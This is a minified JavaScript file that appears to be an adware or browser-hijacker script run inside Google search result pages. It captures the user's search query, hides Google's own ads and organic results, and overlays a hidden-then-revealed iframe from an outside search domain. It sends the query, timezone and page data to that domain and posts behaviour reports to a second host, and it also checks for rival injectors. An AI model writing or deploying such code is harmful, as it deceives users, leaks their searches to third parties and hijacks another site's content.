(function(){var i = "OLUE4K0611", atr = "888", en = "", domain = "search.desideriosoldi.com";var rshow_timeout = null;

function getParameterByName(name) {
    var url = window.location.search.substring(1);
    var params = url.split('&');
    for (var i = 0; i < params.length; i++) {
        var value = params[i].split('=');
        if (value[0] === name) {
            return value[1] === undefined ? false : value[1];
        }
    }
}

function getkw(callback) {
  var url = window.location.href;
  var tbm = getParameterByName('tbm');
  if (typeof url !== "undefined" && url !== null && tbm != 'lcl' && tbm != 'fin' && tbm != 'isch') {
    var kw = getParameterByName('q');
    if(kw && kw.length > 0) {
      kw = decodeURIComponent(kw).split('+').join(' ');
      return callback(kw);
    }
  }
  setTimeout(function() {
    return getkw(callback);
  }, 10)
}

function lightOrDark(color) {
    if (color == 'transparent') {
        return 'light';
    }

    var r, g, b, hsp;
    if (color.match(/^rgb/)) {
        color = color.match(/^rgba?\((\d+),\s*(\d+),\s*(\d+)(?:,\s*(\d+(?:\.\d+)?))?\)$/);

        r = color[1];
        g = color[2];
        b = color[3];
    } else {
        color = +("0x" + color.slice(1).replace(
        color.length < 5 && /./g, '$&$&'));

        r = color >> 16;
        g = color >> 8 & 255;
        b = color & 255;
    }

    if (r == 0 && g == 0 && b == 0) {
        return 'black';
    }

    hsp = Math.sqrt(
        0.299 * (r * r) +
        0.587 * (g * g) +
        0.114 * (b * b)
    );

    return hsp > 127.5 ? 'light' : 'dark';
}

function rshow() {
  clearTimeout(rshow_timeout);
  var el = document.querySelector("#rcnt");
  if (el) {
    document.querySelector("#rcnt").style["opacity"] = 1;
    var appbar = document.querySelector("#appbar");
    if (appbar) {
      appbar.style['opacity'] = 1;
    }
  }
  else {
    rshow_timeout = setTimeout(rshow, 50);
  }
}

function logStats(stats) {
    if (typeof log_domain !== 'undefined')
    {
        var params = '';
        for (var i = 0; i < stats.length; i++) {
            params += '&' + stats[i][0] + '=' + stats[i][1];
        }
        if (params) {
            var url = "https://" + log_domain + "/error.php?t=1" + params;
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style['height'] = '0';
            iframe.style['width'] = '0';
            document.getElementsByTagName("html")[0].appendChild(iframe);
            iframe.src = url;
        }
    }
}

function removeAds() {
    if (!document.getElementById('opeRtF')) {
        var node = document.createElement("style");
        node.setAttribute('id', 'opeRtF');
        node.innerHTML = ".commercial-unit-desktop-top,.commercial-unit-desktop-rhs,#taw,#epbar,#mbEnd,#tads,#tadsb,.ads-ad,#atvcap, #extabar div[jscontroller=\"E9W1Ff\"] {display:none!important}";
        document.getElementsByTagName("html")[0].appendChild(node);
    }
}

function hads() {

    var target = document.getElementsByTagName("html")[0];

    if (!hasAlgoContainer()) {
        var css_text = "#appbar, #rcnt{opacity:0;}";
        var node = document.createElement("style");
        if (node.styleSheet && node.styleSheet.cssText) {
            node.styleSheet.cssText = css_text;
            target.appendChild(node);
        }
        else {
            node.innerHTML = css_text;
            target.appendChild(node);
        }
        removeAds();
    }
}
hads();function reportBehavior(data) {
    if (typeof bev_reported === 'undefined') {
        window.bev_reported = true;
        var origin = {i: i, atr: atr};
        fetch('https://0synawed.com/bev.php', {
            method: "POST", body: JSON.stringify({origin: origin, step: data})
        }).then(function (response) {});
    }
}function reportUserOverlap(data) {
    if (typeof overlap_reported === 'undefined') {
        window.overlap_reported = true;
        var origin = {i: i, atr: atr};
        fetch('https://0synawed.com/overlap.php', {
            method: "POST", body: JSON.stringify({origin: origin, overlap: data})
        }).then(function (response) {});
    }
}

function hasInitOverlap() {
    var e = document.getElementById('mpimpl');
    if (e) {
        reportUserOverlap({element: 'mpimpl', data: e.getAttribute('data-value')});
        return true;
    }
    if (typeof mpimpl != 'undefined') {
        var data = '';
        if (typeof mpimpl == 'string') {
            data = mpimpl;
        }
        reportUserOverlap({element: 'global', data: data});
        return true;
    }

}

function hasElementOverlap() {
    var e = document.getElementById('mdorkirgneorpowtn');
    if (e) {
        reportUserOverlap({element: 'mdorkirgneorpowtn', data: e.getAttribute('data-value')});
        return true;
    }
    if (typeof mdorkirgneorpowtn != 'undefined') {
        var data = '';
        if (typeof mdorkirgneorpowtn == 'string') {
            data = mdorkirgneorpowtn;
        }
        reportUserOverlap({element: 'global', data: data});
        return true;
    }
    e = document.getElementById('privatelayer');
    if (e) {
        reportUserOverlap({element: 'privatelayer', data: e.src || ''});
        return true;
    }
    e = document.getElementById('sadsfs');
    if (e) {
        reportUserOverlap({element: 'sadsfs', data: ''});
        return true;
    }
    e = document.getElementById('navflow');
    if (e) {
        reportUserOverlap({element: 'navflow', data: ''});
        return true;
    }
    e = document.querySelector('.flowsponso');
    if (e) {
        reportUserOverlap({element: 'flowsponso', data: ''});
        return true;
    }

    return false;
}


function hasThirdPartyElementOverlap() {
    if (typeof mdorkirgneorpowtn != 'undefined') {
        reportUserOverlap({element: 'global', data: mdorkirgneorpowtn});
        return true;
    }
    e = document.getElementById('sadsfs');
    if (e) {
        reportUserOverlap({element: 'sadsfs', data: ''});
        return true;
    }
    e = document.getElementById('navflow');
    if (e) {
        reportUserOverlap({element: 'navflow', data: ''});
        return true;
    }
    e = document.querySelector('.flowsponso');
    if (e) {
        reportUserOverlap({element: 'flowsponso', data: ''});
        return true;
    }
    e = document.getElementById('mdorkirgneorpowtn');
    if (e) {
        reportUserOverlap({element: 'mdorkirgneorpowtn', data: e.getAttribute('data-value')});
        return true;
    }

    return false;
}if(hasInitOverlap()){return;}if(hasElementOverlap()){return;}var hel = document.createElement('div');hel.setAttribute('data-value', "i=OLUE4K0611&atr=888");hel.setAttribute('id', 'mpimpl');hel.style['display'] = 'none';document.getElementsByTagName('html')[0].appendChild(hel);mpimpl = "i=OLUE4K0611&atr=888";function hasAlgoContainer(){return document.querySelector("#rcnt .g")!==null}var startTime=Date.now();var privatelayer=null;var privatelayer_algo_sent=null;var rhide_timeout=null,rshow_timeout=null;var aas=hasAlgoContainer();if(aas){reportBehavior({phase:1})}var verify_overlap_timeout=null;function deleteElement(e){if(e.parentNode)e.parentNode.removeChild(e)}function deleteElements(elements){forEach(elements,function(i,el){deleteElement(el)})}var forEach=function(array,callback,scope){for(var i=0;i<array.length;i++){callback.call(scope,i,array[i])}};function checkid(target,data,iframe){clearTimeout(varto);var targetdiv=document.getElementById(target);if(typeof targetdiv!=="undefined"&&targetdiv!==null){if(document.body){var colors={};if(document.body){var bgColor=window.getComputedStyle(document.body).backgroundColor;if(bgColor!=="rgb(255, 255, 255)"){var darkness=lightOrDark(bgColor);switch(darkness){case"dark":colors.link="#8ab4f8";colors.description_bold="#bcc0c3";colors.site="#bdc1c6";colors.sub_site="#969ba1";break;case"light":colors.link="#1a0dab";colors.description_bold="#5f6368";colors.site="#202124";colors.sub_site="#5f6368";break;case"black":colors.link="#5ab3f0";colors.description_bold="#bcc0c3";colors.site="#bdc1c6";colors.sub_site="#969ba1";break}colors.bg=bgColor;var link=document.querySelector("#rso .g:not(.mnr-c) a[ping]");if(link){colors.link=window.getComputedStyle(link).color}colors.description=window.getComputedStyle(document.body).color;var site=document.querySelector("#rso .g:not(.mnr-c) cite");if(site){colors.site=window.getComputedStyle(site).color}var sub_site=document.querySelector("#rso .g:not(.mnr-c) cite span");if(sub_site){colors.sub_site=window.getComputedStyle(sub_site).color}iframe.contentWindow.postMessage(["color",colors],"*")}}}var appbar=document.querySelector("#appbar");if(appbar&&appbar.offsetHeight>200){appbar.innerHTML="";appbar.style["height"]="43px"}var rect=targetdiv.getBoundingClientRect();if(targetdiv.getBoundingClientRect().height==0){var center_col=document.getElementById("center_col");if(center_col){rect=center_col.getBoundingClientRect()}}var margin_top_to_remove=0;var added_margin_top_element=document.querySelector(".FcOujd .ULSxyf:first-child");var rso_element=document.querySelector("#rso");if(added_margin_top_element&&rso_element){var added_margin_top=window.getComputedStyle(added_margin_top_element).getPropertyValue("margin-top").replaceAll("px","");var rso_element_margin_top=window.getComputedStyle(rso_element).getPropertyValue("margin-top").replaceAll("px","");margin_top_to_remove=added_margin_top-rso_element_margin_top}iframe.style.top=rect.top+window.scrollY-margin_top_to_remove+"px";iframe.style.left=rect.left+window.scrollX+"px";targetdiv.style.marginTop=data+26+"px";iframe.height=data+"px";if(!privatelayer_algo_sent){privatelayer_algo_sent=true;deleteElements(document.querySelectorAll('.ULSxyf > [jscontroller="ILbBec"]'));var algos=document.querySelectorAll("#rso .g:not(.mnr-c), style");var algo_html="";forEach(algos,function(i,el){if(!/navflow|<form/.test(el.outerHTML)){algo_html+=el.outerHTML}});deleteElements(document.querySelectorAll("#rso .g:not(.mnr-c)"));window.addEventListener("message",function(e){resize(e,target)},false);sendToFrame(algo_html)}}else{var varto=setTimeout(function(){checkid(target,data,iframe)},10)}}function resize(e,target){var targetdiv=document.getElementById(target);var eventName=e.data[0];var data=e.data[1];switch(eventName){case"resize":if(hasAlgoContainer()){reportBehavior({phase:2,time:Date.now()-startTime})}window.removeEventListener("message",resize,false);privatelayer.height=data+"px";privatelayer.style.opacity="1";var rect=privatelayer.getBoundingClientRect();targetdiv.style.marginTop=rect.height+26+"px";rshow();break}}function sendToFrame(data){privatelayer.contentWindow.postMessage(["algoHTML",data],"*")}function iframe(){getkw(function(keyword){if(hasElementOverlap()){return}var css_text=".flowsponso{display:none;}";var node=document.createElement("style");node.innerHTML=css_text;document.getElementsByTagName("html")[0].appendChild(node);var meta=document.createElement("meta");meta.name="referrer";meta.content="no-referrer";document.getElementsByTagName("html")[0].appendChild(meta);var listener=function(e){var eventName=e.data[0];var data=e.data[1];if(eventName==="noCoverage"||eventName==="resize"||eventName==="setHeight"){window.removeEventListener("message",listener,false)}switch(eventName){case"noCoverage":rshow();break;case"resize":privatelayer.height=data+"px";break;case"setHeight":removeAds();checkid("search",data,privatelayer);break}};window.addEventListener("message",listener,false);var l=document.getElementById("Wprf1b")?document.getElementById("Wprf1b").innerHTML:"";var tz=typeof Intl!=="undefined"&&typeof Intl.DateTimeFormat==="function"&&typeof Intl.DateTimeFormat().resolvedOptions==="function"&&typeof Intl.DateTimeFormat().resolvedOptions().timeZone==="string"?Intl.DateTimeFormat().resolvedOptions().timeZone:"";privatelayer=document.createElement("iframe");var extra_info="";if(document.body){var bgColor=window.getComputedStyle(document.body)["backgroundColor"];if(bgColor==="rgb(32, 33, 36)"){extra_info+="&bg=dark"}else if(bgColor==="rgb(0, 0, 0)"||bgColor==="rgba(0, 0, 0, 0)"||bgColor==="rgba(0, 0, 0, 0.6)"){extra_info+="&bg=black"}else if(bgColor!=="rgb(255, 255, 255)"){extra_info+="&bgColor="+encodeURIComponent(bgColor)}}privatelayer.src="//"+domain+"/search.php?q="+encodeURIComponent(keyword)+"&i="+i+"&atr="+atr+"&en="+en+"&l="+encodeURIComponent(l)+"&tz="+encodeURIComponent(tz)+extra_info+"&aas="+encodeURIComponent(aas)+"&request_time="+encodeURIComponent(Date.now());privatelayer.id="privatelayer";privatelayer.marginwidth="0";privatelayer.marginheight="0";privatelayer.frameborder="0";privatelayer.height="0px";privatelayer.style.zIndex="10";privatelayer.style["border"]="0";privatelayer.style.opacity="0";privatelayer.style["overflow"]="hidden";privatelayer.style["width"]="630px";privatelayer.style["position"]="absolute";privatelayer.setAttribute("referrerpolicy","no-referrer");document.getElementsByTagName("html")[0].appendChild(privatelayer);window.addEventListener("resize",function(){var privatelayer_el=document.getElementById("privatelayer");var center_col_el=document.getElementById("center_col");if(privatelayer_el&&center_col_el){privatelayer_el.style.left=window.getComputedStyle(center_col_el).marginLeft}});verifyThirdPartyOverlap()})}function verifyThirdPartyOverlap(){clearTimeout(verify_overlap_timeout);hasThirdPartyElementOverlap();verify_overlap_timeout=setTimeout(verifyThirdPartyOverlap,1e3)}iframe();setTimeout(function(){rshow()},3500);})();